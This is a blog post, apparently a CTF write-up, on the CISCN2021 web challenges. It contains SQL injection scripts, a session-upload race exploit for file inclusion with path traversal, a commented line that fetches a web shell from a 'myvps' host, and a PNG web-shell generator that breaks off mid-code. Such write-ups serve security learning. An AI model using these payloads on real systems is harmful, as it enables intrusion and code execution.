@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>CISCN2021 Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="CISCN2021 Writeup" />
+<meta property="og:description" content="CISCN2021 Web 部分Writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.h4ck.fun/ciscn2021-writeup/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-05-18T23:55:52+08:00" />
+<meta property="article:modified_time" content="2021-05-18T23:55:52+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.h4ck.fun/logo_.jpg"/>
+
+<meta name="twitter:title" content="CISCN2021 Writeup"/>
+<meta name="twitter:description" content="CISCN2021 Web 部分Writeup"/>
+<meta name="application-name" content="Leon&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/ciscn2021-writeup/" /><link rel="prev" href="https://blog.h4ck.fun/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B/" /><link rel="next" href="https://blog.h4ck.fun/golang_scan_tech/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CISCN2021 Writeup",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.h4ck.fun\/ciscn2021-writeup\/"
+        },"genre": "posts","keywords": "RCE, LFI, XSSearch","wordcount":  2315 ,
+        "url": "https:\/\/blog.h4ck.fun\/ciscn2021-writeup\/","datePublished": "2021-05-18T23:55:52+08:00","dateModified": "2021-05-18T23:55:52+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Leon","logo": "https:\/\/blog.h4ck.fun\/logo_.jpg"},"author": {
+                "@type": "Person",
+                "name": "Leon"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">CISCN2021 Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-05-18">2021-05-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2315 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;<span id="/ciscn2021-writeup/" class="leancloud_visitors" data-flag-title="CISCN2021 Writeup">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#easy_source">easy_source</a></li>
+        <li><a href="#easy_sql">easy_sql</a></li>
+        <li><a href="#middle_source">middle_source</a></li>
+        <li><a href="#upload">upload</a></li>
+        <li><a href="#babyblog">babyblog</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>CISCN2021 Web 部分Writeup</p>
+<h3 id="easy_source">easy_source</h3>
+<p>原题，<code>ReflectionMethod</code> 构造 <code>User</code> 类中的函数方法，再通过 <code>getDocComment</code> 获取函数的注释</p>
+<p>提交参数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment
+</code></pre></td></tr></table>
+</div>
+</div><p>爆破rb的值a-z，在q得到flag：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210515122304432.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210515122304432.png, https://gitee.com/leonsec/images/raw/master/image-20210515122304432.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210515122304432.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210515122304432.png"
+        title="https://gitee.com/leonsec/images/raw/master/image-20210515122304432.png" /></p>
+<h3 id="easy_sql">easy_sql</h3>
+<p>fuzz：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-bansdasdsads.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-bansdasdsads.png, https://gitee.com/leonsec/images/raw/master/image-bansdasdsads.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-bansdasdsads.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-bansdasdsads.png"
+        title="image-bansdasdsads" /></p>
+<p>sqlmap得到表名flag和一个列名id：报错加无列名注入</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210515130056447.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210515130056447.png, https://gitee.com/leonsec/images/raw/master/image-20210515130056447.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210515130056447.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210515130056447.png"
+        title="https://gitee.com/leonsec/images/raw/master/image-20210515130056447.png" /></p>
+<p>一开始用按位比较：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://124.70.35.238:23511/&#39;</span>
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">res</span> <span class="o">+=</span> <span class="n">flag</span>
+    <span class="k">return</span> <span class="n">res</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">200</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+        <span class="n">hexchar</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;1&#39;) or (select 1,&#39;NO&#39;,&#39;CISCN{JGHHS-JPD52-IJK4O-MGPDZ-DUFWI-&#39;)&gt;=(select * from security.flag limit 1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hexchar</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uname&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s1">&#39;passwd&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="n">text</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+        <span class="k">if</span> <span class="s1">&#39;login&lt;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+            <span class="k">break</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>到最后卡住了，换了无列名注入报错爆列名，然后直接报错注入：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210515131951311.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210515131951311.png, https://gitee.com/leonsec/images/raw/master/image-20210515131951311.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210515131951311.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210515131951311.png"
+        title="https://gitee.com/leonsec/images/raw/master/image-20210515131951311.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">admin</span><span class="s1">&#39;)||extractvalue(1,concat(0x7e,(select * from (select * from flag as a join (select * from flag)b using(id,no))c)))#
+</span><span class="s1">//Duplicate column name &#39;</span><span class="n">e0f1d955</span><span class="o">-</span><span class="n">bbba</span><span class="o">-</span><span class="mi">43</span><span class="n">c3</span><span class="o">-</span><span class="n">b078</span><span class="o">-</span><span class="n">a81b3fc4bf28</span><span class="s1">&#39;
+</span><span class="s1">
+</span><span class="s1">admin&#39;</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="o">`</span><span class="n">e0f1d955</span><span class="o">-</span><span class="n">bbba</span><span class="o">-</span><span class="mi">43</span><span class="n">c3</span><span class="o">-</span><span class="n">b078</span><span class="o">-</span><span class="n">a81b3fc4bf28</span><span class="o">`</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">security</span><span class="p">.</span><span class="n">flag</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)))</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~CISCN{JgHhs-jpd52-iJk4O-MGPDz-d&#39;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">admin</span><span class="s1">&#39;)||(extractvalue(1,concat(0x7e,substr((select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),32,50),0x7e)))#
+</span><span class="s1">//XPATH syntax error: &#39;</span><span class="o">~</span><span class="n">uFWI</span><span class="o">-</span><span class="err">}</span><span class="o">~</span><span class="s1">&#39;
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="middle_source">middle_source</h3>
+<p>首页给了任意文件包含</p>
+<p>扫目录得到<code>.listing</code>，得到<code>you_can_seeeeeeee_me.php</code>是phpinfo页面</p>
+<p>有了phpinfo可以尝试直接向phpinfo页面传文件加垃圾数据，同时从phpinfo获取临时文件名进行文件包含，或者利用<code>session.upload_progress</code>进行session文件包含</p>
+<p>前者尝试无效果</p>
+<p>从phpinfo得到了session保存路径：<code>/var/lib/php/sessions/fccecfeaje/</code></p>
+<p>尝试发现可以出网，虽然ban了很多函数，但是可以直接用copy或file_get_contents下载shell</p>
+<p>在<code>/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g</code>发现flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210515185821338.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210515185821338.png, https://gitee.com/leonsec/images/raw/master/image-20210515185821338.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210515185821338.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210515185821338.png"
+        title="https://gitee.com/leonsec/images/raw/master/image-20210515185821338.png" /></p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+
+<span class="c1">#file_content = &#39;&lt;?php print_r(scandir(&#34;/etc&#34;));?&gt;&#39;</span>
+<span class="c1">#file_content = &#39;&lt;?php copy(&#34;http://myvps/s.txt&#34;,&#34;/tmp/leon.php&#34;);echo &#34;666666666&#34;;?&gt;&#39;</span>
+<span class="c1">#s.txt是shell一句话</span>
+<span class="n">file_content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php var_dump(file_get_contents(&#34;/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g&#34;));?&gt;&#39;</span>
+
+<span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://124.70.35.238:23579/&#39;</span>
+<span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">POST</span><span class="p">():</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">file</span><span class="o">=</span><span class="p">{</span>
+            <span class="s2">&#34;upload&#34;</span><span class="p">:(</span><span class="s1">&#39;&lt;?php echo 999;?&gt;&#39;</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+            <span class="s2">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span><span class="p">:</span><span class="n">file_content</span>
+        <span class="p">}</span>
+        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+            <span class="s2">&#34;Cookie&#34;</span><span class="p">:</span><span class="s1">&#39;PHPSESSID=1234&#39;</span>
+        <span class="p">}</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">file</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">READ</span><span class="p">():</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">event</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+        <span class="n">t</span><span class="o">=</span><span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://124.70.35.238:23579/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;cf&#34;</span><span class="p">:</span><span class="s1">&#39;../../../../../../../../../../var/lib/php/sessions/fccecfeaje/sess_1234&#39;</span><span class="p">})</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2230</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+]retry&#39;</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="n">event</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+<span class="n">event</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
+<span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">POST</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">POST</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">POST</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">READ</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">READ</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">READ</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20210515185737528.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210515185737528.png, https://gitee.com/leonsec/images/raw/master/image-20210515185737528.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210515185737528.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20210515185737528.png"
+        title="https://gitee.com/leonsec/images/raw/master/image-20210515185737528.png" /></p>
+<h3 id="upload">upload</h3>
+<p>index.php上传文件，example.php解压zip后缀文件并将解压后的文件重新创建为新图片</p>
+<p>第一个点，绕<code>getimagesize</code>函数获取的长宽限制，文件中只要包含：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">#define width 1
+#define height 1
+</code></pre></td></tr></table>
+</div>
+</div><p>即可</p>
+<p>第二个点，绕过zip后缀中<code>i</code>的过滤，使用<code>mb_strtolower</code>函数的特性：</p>
+<p><a href="https://bugs.php.net/bug.php?id=70072" target="_blank" rel="noopener noreffer">PHP :: Request #70072 :: Add a language avare uppercase/lowercase solution without need of locale change</a></p>
+<p>上传时使用<code>xxx.zİp</code>，经过<code>mb_strtolower</code>后存到服务器的文件名变为<code>xxx.zip</code></p>
+<p>第三个点，上传后解压后的文件会被<code>imagecreatefrompng</code>函数进行重新生成新图片，普通图片马会被该函数给覆盖掉</p>
+<p>所以需要利用PNG格式，向PLTE块写入数据，保证在重载后不变</p>
+<p>可参考：<a href="https://github.com/hxer/imagecreatefrom-/tree/master/png/analysis" target="_blank" rel="noopener noreffer">imagecreatefrom-/png/analysis at master · hxer/imagecreatefrom-</a></p>
+<blockquote>
+<p>分析底层源码可知， png signature 是不可能插入 php 代码的； IHDR 存储的是 png 的图片信息，有固定的长度和格式，程序会提取图片信息数据进行验证，很难插入 php 代码；而 PLTE 主要进行了 CRC 校验和颜色数合法性校验等简单的校验，那么很可能在 data 域插入 php 代码。</p>
+</blockquote>
+<p>或者根据IDAT块的转换算法，直接向IDAT块中写入转换前的数据，经过<code>imagecreatefrompng</code>重载后，生成的新图片中出现了可以利用的恶意代码，网上找的exp，有兴趣的可以自己调一调，内容为<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span>
+           <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span>
+           <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span>
+           <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span>
+           <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
